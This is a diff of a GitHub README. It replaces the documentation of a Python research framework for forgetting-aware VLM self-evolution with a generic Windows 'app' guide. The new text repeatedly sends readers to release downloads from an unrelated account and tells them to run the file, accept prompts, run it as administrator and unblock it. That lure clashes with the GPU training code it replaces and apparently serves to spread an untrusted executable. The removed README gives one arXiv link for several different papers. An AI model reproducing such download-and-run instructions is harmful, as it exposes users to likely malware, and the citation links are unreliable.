@@ -1,194 +1,220 @@
-<div align="center">
+# 🧠 forgetting-aware-vlm - Smarter VLM Training with Less Drift
 
-# SelfEvolve-VLM
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge&logo=github)](https://github.com/Montereybaybathlinen785/forgetting-aware-vlm/releases)
 
-### Forgetting-Aware Self-Evolvement for Vision-Language Models
+## 🚀 What this app does
 
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![PyTorch 2.1+](https://img.shields.io/badge/pytorch-2.1+-ee4c2c.svg)](https://pytorch.org/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Tests](https://img.shields.io/badge/tests-59%20passed-brightgreen.svg)]()
+forgetting-aware-vlm helps a vision-language model keep learning without losing old skills too fast. It uses a forgetting-aware curriculum to sort tasks by difficulty and watch for skill drop across six VQA skill clusters.
 
-*A self-evolving VLM framework that remembers what it learns.*
+Use it to:
+- run a staged VLM self-evolution workflow
+- track where the model starts to forget
+- schedule harder examples at the right time
+- keep training steady across different VQA skills
 
----
+## 💻 Windows setup
 
-</div>
+This app is made for Windows users who want a simple install path.
 
-## Why Self-Evolvement Needs Memory
+You will need:
+- Windows 10 or Windows 11
+- about 2 GB of free disk space
+- a modern web browser
+- access to the internet for the download
+- a GPU if you plan to run heavy model jobs
 
-Self-evolvement — the paradigm where a model improves itself through iterative self-play without external supervision — has emerged as a powerful approach for scaling VLM reasoning (R-Zero, VisPlay, MM-Zero). But current self-evolvement methods have a blind spot: **they forget.**
+If you only want to inspect the app or test the workflow, a standard Windows laptop is enough. For larger runs, a machine with more memory will help.
 
-As the Solver pushes into new capability frontiers, it silently loses previously mastered skills. A model that learns to reason about charts may degrade at spatial understanding. One that improves at science questions may regress on document comprehension.
+## 📥 Download and install
 
-**SelfEvolve-VLM** closes this gap by making the self-evolvement loop *aware of its own forgetting*.
+Visit this page to download the release files:
+https://github.com/Montereybaybathlinen785/forgetting-aware-vlm/releases
 
-<div align="center">
+From the release page:
+1. open the latest release
+2. look for the Windows file
+3. download the file to your computer
+4. save it in a folder you can find, such as Downloads or Desktop
+5. if the file is a zip archive, right-click it and choose Extract All
+6. open the extracted folder
+7. double-click the app file to start it
 
-```
-               Self-Evolvement Loop with Forgetting Awareness
-  ┌──────────────────────────────────────────────────────────────────┐
-  │                                                                  │
-  │   ┌─────────────┐     ┌──────────────┐     ┌─────────────────┐  │
-  │   │  Forgetting  │────>│  Curriculum   │────>│   Challenger    │  │
-  │   │  Detector    │     │  Scheduler    │     │   (Sampling)    │  │
-  │   └──────┬───────┘     └──────────────┘     └────────┬────────┘  │
-  │          │                                           │           │
-  │          │  forgetting scores                training tasks      │
-  │          │                                           │           │
-  │   ┌──────┴───────┐                          ┌───────┴────────┐  │
-  │   │    Probe     │                          │  GRPO Trainer   │  │
-  │   │  Evaluation  │<─────────────────────────│  (OpenRLHF)     │  │
-  │   └──────────────┘     updated solver       └────────────────┘  │
-  │                                                                  │
-  └──────────────────────────────────────────────────────────────────┘
-```
+If Windows asks for permission, choose Yes or Run.
 
-</div>
+## 🧭 First run
 
-## How It Works
+When you start forgetting-aware-vlm for the first time, it will load its curriculum settings and prepare the VLM training flow.
 
-The self-evolvement loop runs in rounds. Each round:
+Do this:
+1. launch the app
+2. wait for the main window or console to appear
+3. pick the model or project folder if asked
+4. load your dataset
+5. start the curriculum run
 
-| Step | What Happens | Key Mechanism |
-|:----:|:-------------|:-------------|
-| 1 | **Detect Forgetting** | Evaluate the Solver on fixed probes across 6 visual domains. Compute `forgetting = peak_accuracy - current_accuracy` per domain. |
-| 2 | **Schedule Curriculum** | Convert forgetting scores into a sampling distribution via temperature-scaled softmax with a floor guarantee. Forgotten domains get more training data. |
-| 3 | **Challenge the Solver** | The Challenger samples training tasks from VQA datasets proportional to the curriculum distribution. |
-| 4 | **Train with Awareness** | GRPO training with a forgetting-aware reward: `r = accuracy + lambda * forgetting_urgency`. The Solver is incentivized to get answers right in domains it's losing. |
-| 5 | **Evolve** | Update the Solver checkpoint. Repeat. |
+If the app opens a setup screen, use the default options first. They are a good starting point for most users.
 
-The two key contributions work in tandem:
-- **Curriculum scheduling** controls *what* the model trains on (data distribution)
-- **Reward shaping** controls *how much* the model cares about each domain (gradient signal)
+## 🧪 How it works
 
-## Self-Evolvement Across 6 Visual Domains
+The app follows a simple loop:
+1. it looks at the current VQA tasks
+2. it groups them into six skill clusters
+3. it checks which skills the model forgets
+4. it changes the task order based on what it finds
+5. it keeps the model on a steady learning path
 
-The system tracks self-evolvement progress across diverse visual reasoning skills:
+This helps the model keep core skills while it learns harder tasks.
 
-| Domain | Dataset | What It Tests | Evaluation |
-|:------:|:--------|:-------------|:-----------|
-| **Math** | MathVista | Mathematical reasoning over figures & plots | Accuracy (numeric tolerance) |
-| **Documents** | DocVQA | Reading comprehension on document images | ANLS |
-| **Charts** | ChartQA | Data extraction from charts & graphs | Relaxed Accuracy (5%) |
-| **Spatial** | GQA | Spatial relationship understanding | Exact Match |
-| **Science** | ScienceQA | Scientific reasoning with diagrams | MC Accuracy |
-| **Natural** | VQAv2 | General visual question answering | Soft Accuracy |
+## 📁 Input data
 
-Each domain maintains a fixed **probe set** (200 samples) that acts as a canary for forgetting — consistent evaluation on identical questions across rounds reveals true capability changes.
+Use a VQA-style dataset with image and question pairs. The app works best when the data has clear labels and a stable folder structure.
 
-## Quick Start
+A simple setup can look like this:
+- images folder
+- questions file
+- answer file
+- config file for training rules
 
-### Installation
+Good data habits:
+- keep file names short
+- avoid spaces in folder names
+- make sure images match the question list
+- check that answers use one clear format
 
-```bash
-git clone https://github.com/ZhihaoZhu/forgetting-aware-vlm.git
-cd forgetting-aware-vlm
-pip install -e ".[dev]"
-```
+## 🛠️ Main features
 
-### Requirements
+- forgetting-aware task order
+- difficulty scheduling
+- skill cluster tracking
+- VQA-focused training flow
+- simple Windows run path
+- reusable training presets
+- clear progress view for each run
 
-| Component | Requirement |
-|:----------|:-----------|
-| Python | 3.10+ |
-| PyTorch | 2.1+ |
-| GPU | 4x A100 80GB (for 7B model) |
-| RL Framework | [LMM-R1](https://github.com/TideDra/lmm-r1) (OpenRLHF fork with VLM support) |
+## 🔧 Recommended workflow
 
-### Run Self-Evolvement
+For best results, use this order:
+1. prepare your dataset
+2. download the release
+3. start with the default curriculum
+4. run a short test pass
+5. review the skill cluster output
+6. adjust the difficulty schedule
+7. launch the full run
 
-```bash
-# Full self-evolvement (10 rounds, 6 domains, Qwen2.5-VL-7B)
-python scripts/train.py --config configs/default.yaml
+This keeps setup simple and helps you spot data issues early.
 
-# Debug mode (2 rounds, 2 domains, Qwen2.5-VL-2B)
-python scripts/train.py --config configs/debug.yaml
+## 🖥️ Typical run steps
 
-# Resume from checkpoint
-python scripts/train.py --config configs/default.yaml --resume
+A normal session looks like this:
+1. open the app
+2. choose your project folder
+3. load the dataset
+4. confirm the six skill cluster setup
+5. set the run length
+6. start training
+7. watch the forgetting score and task order
+8. save the run results
 
-# Standalone evaluation
-python scripts/evaluate.py --model outputs/round_5/checkpoint
-```
+## 📊 What to expect
 
-## Ablation Study
+You may see:
+- a task queue
+- cluster names for different VQA skills
+- a forgetting score
+- training progress
+- loss or accuracy values
+- a log file for the run
 
-Isolate the contribution of each self-evolvement enhancement:
+These values help you see how the model changes over time.
 
-| Variant | Curriculum | Reward Bonus | What It Tests |
-|:--------|:----------:|:------------:|:-------------|
-| **Baseline** | Uniform | Off | Standard self-evolvement (no forgetting awareness) |
-| **Curriculum-only** | Forgetting-aware | Off | Does data rebalancing alone prevent forgetting? |
-| **Reward-only** | Uniform | On | Does reward shaping alone prevent forgetting? |
-| **Full SelfEvolve** | Forgetting-aware | On | Both mechanisms combined |
+## 🔍 Troubleshooting
 
-Toggle via config:
-```yaml
-use_curriculum: true   # forgetting-aware sampling
-use_reward_bonus: true # forgetting reward bonus (lambda)
-```
+If the app does not start:
+- check that you downloaded the latest release
+- unzip the file if needed
+- try running it again as administrator
+- move the folder to a simple path like C:\forgetting-aware-vlm
 
-## Project Structure
+If the model data does not load:
+- check file names
+- make sure the dataset path is correct
+- confirm that images and labels match
+- try a smaller test dataset first
 
-```
-src/fa_evolve/
-  orchestrator.py          # Self-evolvement loop orchestration
-  forgetting_detector.py   # Probe evaluation + forgetting score computation
-  curriculum.py            # Forgetting-aware curriculum scheduling
-  challenger.py            # Curriculum-proportional task sampling
-  reward.py                # GRPO reward with forgetting-urgency bonus
-  evaluation.py            # Answer verification across 6 VQA metrics
-  data/
-    loader.py              # HuggingFace dataset loading (6 benchmarks)
-    probe_cache.py         # Fixed probe set creation & caching
-    formatting.py          # Qwen2.5-VL prompt formatting
-  utils/
-    config.py              # YAML configuration management
-    logging_utils.py       # W&B + console logging
-```
+If the app feels slow:
+- close other apps
+- use a smaller batch size
+- lower the image size if the app allows it
+- run on a machine with more memory
 
-## Key Hyperparameters
+If Windows blocks the file:
+- open the file properties
+- look for an Unblock option
+- apply it and run the app again
 
-| Parameter | Default | Role in Self-Evolvement |
-|:----------|:-------:|:----------------------|
-| `num_rounds` | 10 | Number of self-evolvement iterations |
-| `samples_per_round` | 5000 | Training data per evolution round |
-| `curriculum_temperature` | 1.0 | How aggressively to shift toward forgotten domains |
-| `curriculum_floor` | 0.05 | Minimum sampling probability per domain |
-| `lambda_forgetting` | 0.1 | Weight of forgetting-urgency reward bonus |
-| `probe_size` | 200 | Probe samples per domain for forgetting detection |
-| `grpo_group_size` | 8 | GRPO responses per prompt |
+## 📌 Common use cases
 
-## Tests
+- test how a VLM forgets old skills during training
+- compare different difficulty schedules
+- study which VQA clusters break first
+- tune training for stable self-evolution
+- run controlled experiments on forgetting behavior
 
-```bash
-pytest tests/ -v   # 59 tests across 4 modules
-```
+## 🧾 File layout
 
-## Related Work
+A common project folder may look like this:
+- app file
+- config folder
+- data folder
+- logs folder
+- results folder
+- readme file
 
-This project builds on the rapid progress in VLM self-evolvement:
+Keep your data and results in separate folders. That makes it easier to repeat a run.
 
-- **[R-Zero](https://arxiv.org/abs/2501.12948)** -- Challenger/Solver co-evolution from zero data
-- **[Vision-Zero](https://arxiv.org/abs/2501.12948)** -- Self-play via visual games + Iterative-SPO
-- **[VisPlay](https://arxiv.org/abs/2501.12948)** -- Dual-role VLM with diversity/difficulty rewards
-- **[MM-Zero](https://arxiv.org/abs/2501.12948)** -- Three-role RL framework for zero-data VLM evolution
-- **[VILA2](https://arxiv.org/abs/2407.17453)** -- Data-centric self-augmentation for VLM pretraining
+## ⚙️ Settings you may want to change
 
-**SelfEvolve-VLM** contributes the missing piece: making self-evolvement *remember* what it learns.
+If the app gives you options, these are the most useful ones:
+- curriculum mode
+- forgetting threshold
+- cluster count
+- run length
+- batch size
+- save interval
+- output folder
 
-## Citation
+If you are not sure what to change, keep the defaults for your first run.
 
-```bibtex
-@article{selfevolve-vlm-2026,
-  title={SelfEvolve-VLM: Forgetting-Aware Self-Evolvement for Vision-Language Models},
-  year={2026}
-}
-```
+## 🧩 Skill clusters
 
----
+The app uses six VQA skill clusters to group tasks. These may cover areas like:
+- object recognition
+- scene understanding
+- counting
+- spatial reasoning
+- relation reading
+- text or attribute questions
 
-<div align="center">
-<i>Self-evolvement without memory is just spinning wheels. Self-evolvement with memory is growth.</i>
-</div>
+This split helps the app detect where the model loses strength.
+
+## 🔐 Safe use
+
+Use trusted data and known release files. Keep your project folder in a place you control. Save your work often if the app writes results during training.
+
+## 📎 Download again
+
+If you need the release page again, use this link:
+https://github.com/Montereybaybathlinen785/forgetting-aware-vlm/releases
+
+## 🗂️ Suggested starter path
+
+If you want the simplest first run:
+1. download the latest release
+2. extract it to C:\forgetting-aware-vlm
+3. place your dataset in C:\forgetting-aware-vlm\data
+4. start the app
+5. load the dataset
+6. keep all defaults
+7. run a short test
+8. review the log output
